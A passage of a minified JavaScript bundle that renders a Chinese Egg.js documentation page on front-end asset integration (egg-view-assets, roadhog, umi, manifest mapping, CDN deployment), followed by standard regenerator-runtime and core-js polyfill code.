",r.a.createElement(l["Link"],{to:"https://webpack.js.org/"},"webpack"),"\u3001",r.a.createElement(l["Link"],{to:"https://github.com/sorrycc/roadhog"},"roadhog"),"\u3001",r.a.createElement(l["Link"],{to:"https://umijs.org/"},"umi")," \u7b49")),r.a.createElement("p",null,"\u53ef\u4ee5\u5148\u67e5\u770b\u793a\u4f8b"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/assets-with-roadhog"},"roadhog \u5de5\u5177\u793a\u4f8b")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/assets-with-umi"},"umi \u5de5\u5177\u793a\u4f8b")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-ant-design-pro"},"Ant Design Pro \u793a\u4f8b"))),r.a.createElement("h2",{id:"\u9875\u9762\u6e32\u67d3"},r.a.createElement(l["AnchorLink"],{to:"#\u9875\u9762\u6e32\u67d3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9875\u9762\u6e32\u67d3"),r.a.createElement("p",null,"\u53ef\u901a\u8fc7\u81ea\u52a8\u6216\u624b\u52a8\u7684\u65b9\u5f0f\u6dfb\u52a0\u9759\u6001\u8d44\u6e90\uff0c\u4ee5\u4e0b\u6709\u4e24\u79cd\u65b9\u5f0f"),r.a.createElement("h3",{id:"\u4f7f\u7528-assets-\u6a21\u677f\u5f15\u64ce"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-assets-\u6a21\u677f\u5f15\u64ce","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 assets \u6a21\u677f\u5f15\u64ce"),r.a.createElement("p",null,"assets \u6a21\u677f\u5f15\u64ce\u5e76\u975e\u670d\u52a1\u7aef\u6e32\u67d3\uff0c\u800c\u662f\u4ee5\u4e00\u4e2a\u9759\u6001\u8d44\u6e90\u6587\u4ef6\u4f5c\u4e3a\u5165\u53e3\uff0c\u4f7f\u7528\u57fa\u7840\u6a21\u677f\u6e32\u67d3\u51fa html\uff0c\u5e76\u5c06\u8fd9\u4e2a\u6587\u4ef6\u63d2\u5165\u5230 html \u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/assets-with-roadhog"},"\u4f7f\u7528 roadhog \u7684\u4f8b\u5b50"),"\u3002"),r.a.createElement("p",null,"\u914d\u7f6e\u63d2\u4ef6"),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.assets = {\n  enable: true,\n  package: 'egg-view-assets',\n};",lang:"js"}),r.a.createElement("p",null,"\u914d\u7f6e assets \u6a21\u677f\u5f15\u64ce"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.view = {\n  mapping: {\n    '.js': 'assets',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u9759\u6001\u8d44\u6e90\u5165\u53e3\u6587\u4ef6 ",r.a.createElement("code",null,"app/view/index.js"),"\uff0c\u7136\u540e\u8c03\u7528 render \u65b9\u6cd5\u8fdb\u884c\u6e32\u67d3"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nmodule.exports = class HomeController extends Controller {\n  async render() {\n    await this.ctx.render('index.js');\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u6e32\u67d3\u7684\u7ed3\u679c\u5982\u4e0b"),r.a.createElement(o["a"],{code:'<!doctype html>\n<html>\n  <head>\n    <link rel="stylesheet" href="http://127.0.0.1:8000/index.css"></link>\n  </head>\n  <body>\n    <div id="root"></div>\n    <script src="http://127.0.0.1:8000/index.js"><\/script>\n  </body>\n</html>',lang:"html"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u8fd9\u4e2a\u8def\u5f84\u751f\u6210\u89c4\u5219\u662f\u6709\u6620\u5c04\u7684\uff0c\u5982 ",r.a.createElement("code",null,"index.js")," -> ",r.a.createElement("code",null,"http://127.0.0.1:8000/index.js"),"\u3002\u5982\u679c\u672c\u5730\u5f00\u53d1\u5de5\u5177\u4e0d\u652f\u6301\u8fd9\u5c42\u6620\u5c04\uff0c\u6bd4\u5982\u81ea\u5b9a\u4e49\u4e86 entry \u914d\u7f6e\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce\u3002")),r.a.createElement("h4",{id:"\u5168\u5c40\u81ea\u5b9a\u4e49-html-\u6a21\u677f"},r.a.createElement(l["AnchorLink"],{to:"#\u5168\u5c40\u81ea\u5b9a\u4e49-html-\u6a21\u677f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5168\u5c40\u81ea\u5b9a\u4e49 html \u6a21\u677f"),r.a.createElement("p",null,"\u4e00\u822c\u9ed8\u8ba4\u7684 html \u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u53ef\u4ee5\u6307\u5b9a\u6a21\u677f\u8def\u5f84\u548c\u6a21\u677f\u5f15\u64ce\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = (appInfo) => ({\n  assets: {\n    templatePath: path.join(appInfo.baseDir, 'app/view/template.html'),\n    templateViewEngine: 'nunjucks',\n  },\n});",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u6a21\u677f\u6587\u4ef6"),r.a.createElement(o["a"],{code:'<!DOCTYPE html>\n<html>\n  <head>\n    {{ helper.assets.getStyle() | safe }}\n  </head>\n  <body>\n    <div id="root"></div>\n    {{ helper.assets.getScript() | safe }}\n  </body>\n</html>',lang:"html"}),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-assets"},"egg-view-assets")," \u63d2\u4ef6\u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"helper.assets")," \u6839\u636e\u81ea\u5df1\u7684\u573a\u666f\u8c03\u7528\uff0c",r.a.createElement("code",null,"helper.assets.getScript()")," \u53ef\u4ee5\u4e0d\u7528\u4f20\u53c2\uff0c\u4f1a\u5c06 ",r.a.createElement("code",null,"render")," \u51fd\u6570\u7684\u53c2\u6570\u900f\u4f20\u3002"),r.a.createElement("h4",{id:"\u9875\u9762\u81ea\u5b9a\u4e49-html-\u6a21\u677f"},r.a.createElement(l["AnchorLink"],{to:"#\u9875\u9762\u81ea\u5b9a\u4e49-html-\u6a21\u677f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u9875\u9762\u81ea\u5b9a\u4e49 html \u6a21\u677f"),r.a.createElement("p",null,"\u652f\u6301\u6839\u636e\u4e0d\u540c\u9875\u9762\u6307\u5b9a\u6a21\u677f\uff0c\u53ef\u4ee5\u5728 ",r.a.createElement("code",null,"render")," \u65b9\u6cd5\u4f20\u53c2"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nmodule.exports = class HomeController extends Controller {\n  async render() {\n    await this.ctx.render(\n      'index.js',\n      {},\n      {\n        templatePath: path.join(\n          this.app.config.baseDir,\n          'app/view/template.html',\n        ),\n        templateViewEngine: 'nunjucks',\n      },\n    );\n  }\n};",lang:"js"}),r.a.createElement("h4",{id:"\u4fee\u6539\u9759\u6001\u8d44\u6e90\u76ee\u5f55"},r.a.createElement(l["AnchorLink"],{to:"#\u4fee\u6539\u9759\u6001\u8d44\u6e90\u76ee\u5f55","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4fee\u6539\u9759\u6001\u8d44\u6e90\u76ee\u5f55"),r.a.createElement("p",null,"\u4ee5\u4e0a\u4f8b\u5b50\u662f\u5c06\u9759\u6001\u8d44\u6e90\u653e\u5230 ",r.a.createElement("code",null,"app/view")," \u76ee\u5f55\u4e0b\uff0c\u4f46\u5927\u90e8\u5206\u60c5\u51b5\u5e0c\u671b\u653e\u5230\u72ec\u7acb\u76ee\u5f55\uff0c\u5982 ",r.a.createElement("code",null,"app/assets"),"\u3002\u56e0\u4e3a assets \u6a21\u677f\u5f15\u64ce\u4f7f\u7528 ",r.a.createElement("code",null,"egg-view")," \u7684\u52a0\u8f7d\u5668\uff0c\u6240\u4ee5\u76f4\u63a5\u4fee\u6539\u5176\u914d\u7f6e"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = (appInfo) => ({\n  view: {\n    // \u5982\u679c\u8fd8\u6709\u5176\u4ed6\u6a21\u677f\u5f15\u64ce\uff0c\u9700\u8981\u5408\u5e76\u591a\u4e2a\u76ee\u5f55\n    root: path.join(appInfo.baseDir, 'app/assets'),\n  },\n});",lang:"js"}),r.a.createElement("h3",{id:"\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528\u5176\u4ed6\u6a21\u677f\u5f15\u64ce"),r.a.createElement("p",null,"\u5982\u679c\u65e0\u6cd5\u6ee1\u8db3",r.a.createElement(l["AnchorLink"],{to:"#%E6%98%A0%E5%B0%84%E5%85%B3%E7%B3%BB"},"\u6587\u4ef6\u6620\u5c04"),"\uff0c\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u6a21\u677f\u5f15\u64ce\u4f7f\u7528\uff0c\u8fd9\u65f6\u4e0d\u9700\u8981\u914d\u7f6e assets \u6a21\u677f\u5f15\u64ce\uff0c\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/assets-with-umi"},"\u4f7f\u7528 umi \u7684\u4f8b\u5b50"),"\u3002"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.view = {\n  mapping: {\n    '.html': 'nunjucks',\n  },\n};",lang:"js"}),r.a.createElement("p",null,"\u6e32\u67d3\u6a21\u677f"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nmodule.exports = class HomeController extends Controller {\n  async render() {\n    await this.ctx.render('index.html');\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u6dfb\u52a0\u6a21\u677f\u6587\u4ef6\uff08\u7b80\u5316\u4e86 umi \u7684\u6a21\u677f\uff09"),r.a.createElement(o["a"],{code:"<!DOCTYPE html>\n<html>\n  <head>\n    {{ helper.assets.getStyle('umi.css') | safe }}\n  </head>\n  <body>\n    <div id=\"root\"></div>\n    {{ helper.assets.getScript('umi.js') | safe }}\n  </body>\n</html>",lang:"html"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5728\u5176\u4ed6\u6a21\u677f\u4e2d\u5fc5\u987b\u6dfb\u52a0\u53c2\u6570\u751f\u6210\u9700\u8981\u7684\u9759\u6001\u8d44\u6e90\u8def\u5f84")),r.a.createElement("h3",{id:"\u4e0a\u4e0b\u6587\u6570\u636e"},r.a.createElement(l["AnchorLink"],{to:"#\u4e0a\u4e0b\u6587\u6570\u636e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e0a\u4e0b\u6587\u6570\u636e"),r.a.createElement("p",null,"\u6709\u65f6\u5019\u524d\u7aef\u9700\u8981\u83b7\u53d6\u670d\u52a1\u7aef\u6570\u636e\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u9875\u9762\u65f6\u4f1a\u5411 window \u5168\u5c40\u5bf9\u8c61\u8bbe\u7f6e\u6570\u636e\u3002"),r.a.createElement("p",null,"assets \u6a21\u677f\u5f15\u64ce\u53ef\u76f4\u63a5\u4f20\u5165\u53c2\u6570\uff0c\u9ed8\u8ba4\u524d\u7aef\u4ee3\u7801\u53ef\u4ee5\u4ece ",r.a.createElement("code",null,"window.context")," \u83b7\u53d6\u6570\u636e\u3002"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nmodule.exports = class HomeController extends Controller {\n  async render() {\n    await this.ctx.render('index.js', { data: 1 });\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u5176\u4ed6\u6a21\u677f\u5f15\u64ce\u9700\u8981\u8c03\u7528 ",r.a.createElement("code",null,"helper.assets.getContext(__context__)")," \u5e76\u4f20\u5165\u4e0a\u4e0b\u6587\u7684\u53c2\u6570"),r.a.createElement(o["a"],{code:"// app/controller/home.js\nmodule.exports = class HomeController extends Controller {\n  async render() {\n    await this.ctx.render('index.html', {\n      __context__: { data: 1 },\n    });\n  }\n};",lang:"js"}),r.a.createElement("p",null,"\u9ed8\u8ba4\u5c5e\u6027\u4e3a ",r.a.createElement("code",null,"context"),"\uff0c\u8fd9\u4e2a\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u4fee\u6539"),r.a.createElement(o["a"],{code:"exports.assets = {\n  contextKey: '__context__',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u6784\u5efa\u5de5\u5177"},r.a.createElement(l["AnchorLink"],{to:"#\u6784\u5efa\u5de5\u5177","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6784\u5efa\u5de5\u5177"),r.a.createElement("p",null,"\u8fd9\u79cd\u6a21\u5f0f\u6700\u91cd\u8981\u7684\u662f\u548c\u6784\u5efa\u5de5\u5177\u6574\u5408\uff0c\u4fdd\u8bc1\u672c\u5730\u5f00\u53d1\u4f53\u9a8c\u53ca\u81ea\u52a8\u90e8\u7f72\uff0c\u6240\u4ee5\u6784\u5efa\u5de5\u5177\u548c\u6846\u67b6\u9700\u8981\u6709\u4e00\u5c42\u7ea6\u5b9a\u3002"),r.a.createElement("p",null,"\u4e0b\u9762\u4ee5 ",r.a.createElement(l["Link"],{to:"https://github.com/sorrycc/roadhog"},"roadhog")," \u4e3a\u4f8b"),r.a.createElement("h3",{id:"\u6620\u5c04\u5173\u7cfb"},r.a.createElement(l["AnchorLink"],{to:"#\u6620\u5c04\u5173\u7cfb","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6620\u5c04\u5173\u7cfb"),r.a.createElement("p",null,"\u6784\u5efa\u5de5\u5177\u7684 entry \u914d\u7f6e\u51b3\u5b9a\u4e86\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://webpack.js.org/"},"webpack")," \u5c01\u88c5\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/sorrycc/roadhog"},"roadhog"),"\u3001",r.a.createElement(l["Link"],{to:"https://umijs.org/"},"umi")," \u7b49\u5de5\u5177\u5185\u7f6e\u4e86\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u679c\u5355\u72ec\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://webpack.js.org/"},"webpack")," \u9700\u8981\u6839\u636e\u8fd9\u5c42\u6620\u5c04\u6765\u9009\u62e9\u7528\u54ea\u79cd\u65b9\u5f0f\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,"\u6587\u4ef6\u6e90\u7801 ",r.a.createElement("code",null,"app/assets/index.js"),"\uff0c\u5bf9\u5e94\u7684 entry \u4e3a ",r.a.createElement("code",null,"index.js"))),r.a.createElement("li",null,r.a.createElement("p",null,"\u672c\u5730\u9759\u6001\u670d\u52a1\u63a5\u6536\u4ee5\u6b64\u4e3a entry\uff0c\u5982\u8bf7\u6c42 ",r.a.createElement("code",null,"http://127.0.0.1:8000/index.js"))),r.a.createElement("li",null,r.a.createElement("p",null,"\u6784\u5efa\u751f\u6210\u7684\u6587\u4ef6\u9700\u8981\u6709\u8fd9\u5c42\u6620\u5c04\u5173\u7cfb\uff0c\u5982\u751f\u6210 index.","{","hash","}",".js \u5e76\u751f\u6210 manifest \u6587\u4ef6\u63cf\u8ff0\u5173\u7cfb\u5982"),r.a.createElement(o["a"],{code:'{\n  "index.js": "index.{hash}.js"\n}',lang:"json"}))),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/sorrycc/roadhog"},"roadhog")," \u5b8c\u5168\u6ee1\u8db3\u8fd9\u4e2a\u6620\u5c04\u5173\u7cfb\u4f7f\u7528 ",r.a.createElement(l["AnchorLink"],{to:"#%E4%BD%BF%E7%94%A8-assets-%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"},"assets \u6a21\u677f\u5f15\u64ce"),"\u3002\u800c ",r.a.createElement(l["Link"],{to:"https://umijs.org/"},"umi")," \u4e0d\u6ee1\u8db3\u6587\u4ef6\u6620\u5c04\uff0c\u56e0\u4e3a\u4ed6\u53ea\u6709\u4e00\u4e2a\u5165\u53e3 ",r.a.createElement("code",null,"umi.js")," \u6587\u4ef6\uff0c\u6240\u4ee5\u9009\u62e9",r.a.createElement(l["AnchorLink"],{to:"#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"},"\u5176\u4ed6\u6a21\u677f\u5f15\u64ce"),"\u7684\u65b9\u6848\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u5176\u4ed6\u6784\u5efa\u5de5\u5177\u7684\u63a5\u5165\u9700\u8981\u6ee1\u8db3\u8fd9\u5c42\u6620\u5c04\u5173\u7cfb\u3002")),r.a.createElement("h3",{id:"\u672c\u5730\u5f00\u53d1"},r.a.createElement(l["AnchorLink"],{to:"#\u672c\u5730\u5f00\u53d1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u672c\u5730\u5f00\u53d1"),r.a.createElement("p",null,"\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/blob/master/assets-with-roadhog/config/config.default.js"},"\u793a\u4f8b\u914d\u7f6e"),"\uff0c\u672c\u5730\u670d\u52a1\u914d\u7f6e\u6210 ",r.a.createElement("code",null,"roadhog dev"),"\uff0c\u914d\u7f6e ",r.a.createElement("code",null,"port")," \u6765\u68c0\u67e5\u670d\u52a1\u662f\u5426\u542f\u52a8\u5b8c\u6210\uff0c\u56e0\u4e3a roadhog \u9ed8\u8ba4\u542f\u52a8\u7aef\u53e3\u4e3a 8000\uff0c\u6240\u4ee5\u8fd9\u91cc\u914d\u7f6e\u6210 8000\u3002"),r.a.createElement(o["a"],{code:"exports.assets = {\n  devServer: {\n    command: 'roadhog dev',\n    port: 8000,\n  },\n};",lang:"js"}),r.a.createElement("h3",{id:"\u90e8\u7f72"},r.a.createElement(l["AnchorLink"],{to:"#\u90e8\u7f72","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u90e8\u7f72"),r.a.createElement("p",null,"\u9759\u6001\u8d44\u6e90\u90e8\u7f72\u4e4b\u524d\u9700\u8981\u6784\u5efa\uff0c\u914d\u7f6e ",r.a.createElement("code",null,"roadhog build")," \u547d\u4ee4\uff0c\u5e76\u6267\u884c ",r.a.createElement("code",null,"npm run build")),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "build": "SET_PUBLIC_PATH=true roadhog build"\n  }\n}',lang:"json"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u8fd9\u91cc\u6dfb\u52a0\u4e86 ",r.a.createElement("code",null,"SET_PUBLIC_PATH")," \u53d8\u91cf\u662f\u56e0\u4e3a roadhog \u8fd9\u6837\u624d\u80fd\u5f00\u542f publicPath")),r.a.createElement("p",null,"\u6784\u5efa\u7684\u7ed3\u679c\u6839\u636e ",r.a.createElement("code",null,".webpackrc")," \u914d\u7f6e\u7684 output \u51b3\u5b9a\uff0c\u793a\u4f8b\u662f\u653e\u5230 ",r.a.createElement("code",null,"app/public")," \u76ee\u5f55\u4e0b\uff0c\u7531 ",r.a.createElement("code",null,"egg-static")," \u63d0\u4f9b\u670d\u52a1\u3002"),r.a.createElement("p",null,"\u540c\u65f6\u6839\u636e ",r.a.createElement("code",null,".webpackrc")," \u914d\u7f6e\u7684 manifest \u751f\u6210\u4e00\u4e2a ",r.a.createElement("code",null,"manifest.json")," \u6587\u4ef6\u5230 ",r.a.createElement("code",null,"config")," \u76ee\u5f55\u4e0b\uff08egg \u9700\u8981\u8bfb\u53d6\u8fd9\u4e2a\u6587\u4ef6\u4f5c\u4e3a\u6620\u5c04\u5173\u7cfb\uff09\u3002"),r.a.createElement("h4",{id:"\u5e94\u7528\u63d0\u4f9b\u670d\u52a1"},r.a.createElement(l["AnchorLink"],{to:"#\u5e94\u7528\u63d0\u4f9b\u670d\u52a1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e94\u7528\u63d0\u4f9b\u670d\u52a1"),r.a.createElement("p",null,"\u73b0\u5728\u5e94\u7528\u542f\u52a8\u540e\u53ef\u4ee5\u901a\u8fc7 ",r.a.createElement("code",null,"http://127.0.0.1:7001/public/index.","{","hash","}",".js")," \u8bbf\u95ee\u9759\u6001\u8d44\u6e90\uff0c\u53d1\u73b0\u8fd9\u91cc\u591a\u4e86\u4e00\u5c42 public \u7684\u8def\u5f84\uff0c\u6240\u4ee5\u9700\u8981\u6dfb\u52a0 publicPath \u914d\u7f6e\u3002"),r.a.createElement(o["a"],{code:"// config/config.prod.js\nexports.assets = {\n  publicPath: '/public/',\n};",lang:"js"}),r.a.createElement("h4",{id:"\u4f7f\u7528-cdn"},r.a.createElement(l["AnchorLink"],{to:"#\u4f7f\u7528-cdn","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4f7f\u7528 CDN"),r.a.createElement("p",null,"\u4e00\u822c\u9759\u6001\u8d44\u6e90\u90fd\u4f1a\u53d1\u5230 CDN\uff0c\u6240\u4ee5\u5728\u6784\u5efa\u5b8c\u6210\u540e\u9700\u8981\u5e73\u53f0\u5c06\u6784\u5efa\u4ea7\u7269\u53d1\u5e03\u5230 CDN \u4e0a\uff0c\u5982 ",r.a.createElement("code",null,"https://cdn/myapp/index.","{","hash","}",".js"),"\u3002"),r.a.createElement("p",null,"\u73b0\u5728\u9664\u4e86 publichPath \u8fd8\u9700\u8981\u4fee\u6539\u9759\u6001\u8d44\u6e90\u5730\u5740"),r.a.createElement(o["a"],{code:"// config/config.prod.js\nexports.assets = {\n  url: 'https://cdn',\n  publicPath: '/myapp/',\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},tzIS:function(e,t,n){var a=function(e){"use strict";var t,n=Object.prototype,a=n.hasOwnProperty,r="function"===typeof Symbol?Symbol:{},l=r.iterator||"@@iterator",o=r.asyncIterator||"@@asyncIterator",i=r.toStringTag||"@@toStringTag";function c(e,t,n,a){var r=t&&t.prototype instanceof g?t:g,l=Object.create(r.prototype),o=new L(a||[]);return l._invoke=j(e,n,o),l}function s(e,t,n){try{return{type:"normal",arg:e.call(t,n)}}catch(a){return{type:"throw",arg:a}}}e.wrap=c;var u="suspendedStart",d="suspendedYield",m="executing",p="completed",h={};function g(){}function f(){}function E(){}var b={};b[l]=function(){return this};var v=Object.getPrototypeOf,y=v&&v(v(T([])));y&&y!==n&&a.call(y,l)&&(b=y);var k=E.prototype=g.prototype=Object.create(b);function w(e){["next","throw","return"].forEach((function(t){e[t]=function(e){return this._invoke(t,e)}}))}function x(e,t){function n(r,l,o,i){var c=s(e[r],e,l);if("throw"!==c.type){var u=c.arg,d=u.value;return d&&"object"===typeof d&&a.call(d,"__await")?t.resolve(d.__await).then((function(e){n("next",e,o,i)}),(function(e){n("throw",e,o,i)})):t.resolve(d).then((function(e){u.value=e,o(u)}),(function(e){return n("throw",e,o,i)}))}i(c.arg)}var r;function l(e,a){function l(){return new t((function(t,r){n(e,a,t,r)}))}return r=r?r.then(l,l):l()}this._invoke=l}function j(e,t,n){var a=u;return function(r,l){if(a===m)throw new Error("Generator is already running");if(a===p){if("throw"===r)throw l;return N()}n.method=r,n.arg=l;while(1){var o=n.delegate;if(o){var i=S(o,n);if(i){if(i===h)continue;return i}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if(a===u)throw a=p,n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);a=m;var c=s(e,t,n);if("normal"===c.type){if(a=n.done?p:d,c.arg===h)continue;return{value:c.arg,done:n.done}}"throw"===c.type&&(a=p,n.method="throw",n.arg=c.arg)}}}function S(e,n){var a=e.iterator[n.method];if(a===t){if(n.delegate=null,"throw"===n.method){if(e.iterator["return"]&&(n.method="return",n.arg=t,S(e,n),"throw"===n.method))return h;n.method="throw",n.arg=new TypeError("The iterator does not provide a 'throw' method")}return h}var r=s(a,e.iterator,n.arg);if("throw"===r.type)return n.method="throw",n.arg=r.arg,n.delegate=null,h;var l=r.arg;return l?l.done?(n[e.resultName]=l.value,n.next=e.nextLoc,"return"!==n.method&&(n.method="next",n.arg=t),n.delegate=null,h):l:(n.method="throw",n.arg=new TypeError("iterator result is not an object"),n.delegate=null,h)}function C(e){var t={tryLoc:e[0]};1 in e&&(t.catchLoc=e[1]),2 in e&&(t.finallyLoc=e[2],t.afterLoc=e[3]),this.tryEntries.push(t)}function A(e){var t=e.completion||{};t.type="normal",delete t.arg,e.completion=t}function L(e){this.tryEntries=[{tryLoc:"root"}],e.forEach(C,this),this.reset(!0)}function T(e){if(e){var n=e[l];if(n)return n.call(e);if("function"===typeof e.next)return e;if(!isNaN(e.length)){var r=-1,o=function n(){while(++r<e.length)if(a.call(e,r))return n.value=e[r],n.done=!1,n;return n.value=t,n.done=!0,n};return o.next=o}}return{next:N}}function N(){return{value:t,done:!0}}return f.prototype=k.constructor=E,E.constructor=f,E[i]=f.displayName="GeneratorFunction",e.isGeneratorFunction=function(e){var t="function"===typeof e&&e.constructor;return!!t&&(t===f||"GeneratorFunction"===(t.displayName||t.name))},e.mark=function(e){return Object.setPrototypeOf?Object.setPrototypeOf(e,E):(e.__proto__=E,i in e||(e[i]="GeneratorFunction")),e.prototype=Object.create(k),e},e.awrap=function(e){return{__await:e}},w(x.prototype),x.prototype[o]=function(){return this},e.AsyncIterator=x,e.async=function(t,n,a,r,l){void 0===l&&(l=Promise);var o=new x(c(t,n,a,r),l);return e.isGeneratorFunction(n)?o:o.next().then((function(e){return e.done?e.value:o.next()}))},w(k),k[i]="Generator",k[l]=function(){return this},k.toString=function(){return"[object Generator]"},e.keys=function(e){var t=[];for(var n in e)t.push(n);return t.reverse(),function n(){while(t.length){var a=t.pop();if(a in e)return n.value=a,n.done=!1,n}return n.done=!0,n}},e.values=T,L.prototype={constructor:L,reset:function(e){if(this.prev=0,this.next=0,this.sent=this._sent=t,this.done=!1,this.delegate=null,this.method="next",this.arg=t,this.tryEntries.forEach(A),!e)for(var n in this)"t"===n.charAt(0)&&a.call(this,n)&&!isNaN(+n.slice(1))&&(this[n]=t)},stop:function(){this.done=!0;var e=this.tryEntries[0],t=e.completion;if("throw"===t.type)throw t.arg;return this.rval},dispatchException:function(e){if(this.done)throw e;var n=this;function r(a,r){return i.type="throw",i.arg=e,n.next=a,r&&(n.method="next",n.arg=t),!!r}for(var l=this.tryEntries.length-1;l>=0;--l){var o=this.tryEntries[l],i=o.completion;if("root"===o.tryLoc)return r("end");if(o.tryLoc<=this.prev){var c=a.call(o,"catchLoc"),s=a.call(o,"finallyLoc");if(c&&s){if(this.prev<o.catchLoc)return r(o.catchLoc,!0);if(this.prev<o.finallyLoc)return r(o.finallyLoc)}else if(c){if(this.prev<o.catchLoc)return r(o.catchLoc,!0)}else{if(!s)throw new Error("try statement without catch or finally");if(this.prev<o.finallyLoc)return r(o.finallyLoc)}}}},abrupt:function(e,t){for(var n=this.tryEntries.length-1;n>=0;--n){var r=this.tryEntries[n];if(r.tryLoc<=this.prev&&a.call(r,"finallyLoc")&&this.prev<r.finallyLoc){var l=r;break}}l&&("break"===e||"continue"===e)&&l.tryLoc<=t&&t<=l.finallyLoc&&(l=null);var o=l?l.completion:{};return o.type=e,o.arg=t,l?(this.method="next",this.next=l.finallyLoc,h):this.complete(o)},complete:function(e,t){if("throw"===e.type)throw e.arg;return"break"===e.type||"continue"===e.type?this.next=e.arg:"return"===e.type?(this.rval=this.arg=e.arg,this.method="return",this.next="end"):"normal"===e.type&&t&&(this.next=t),h},finish:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.finallyLoc===e)return this.complete(n.completion,n.afterLoc),A(n),h}},catch:function(e){for(var t=this.tryEntries.length-1;t>=0;--t){var n=this.tryEntries[t];if(n.tryLoc===e){var a=n.completion;if("throw"===a.type){var r=a.arg;A(n)}return r}}throw new Error("illegal catch attempt")},delegateYield:function(e,n,a){return this.delegate={iterator:T(e),resultName:n,nextLoc:a},"next"===this.method&&(this.arg=t),h}},e}(e.exports);try{regeneratorRuntime=a}catch(r){Function("r","regeneratorRuntime = r")(a)}},u3TI:function(e,t,n){var a=n("9Rcy"),r=n("TwHz"),l=n("oyD1"),o=n("PE5i"),i=Object.defineProperty;t.f=a?i:function(e,t,n){if(l(e),t=o(t,!0),l(n),r)try{return i(e,t,n)}catch(a){}if("get"in n||"set"in n)throw TypeError("Accessors not supported");return"value"in n&&(e[t]=n.value),e}},u7uH:function(e,t,n){"use strict";var a=n("0mt+"),r=n("XaNN"),l=n("m/os"),o=n("Xdqv"),i=n("xxe1"),c=[],s=c.sort,u=o((function(){c.sort(void 0)})),d=o((function(){c.sort(null)})),m=i("sort"),p=u||!d||!m;a({target:"Array",proto:!0,forced:p},{sort:function(e){return void 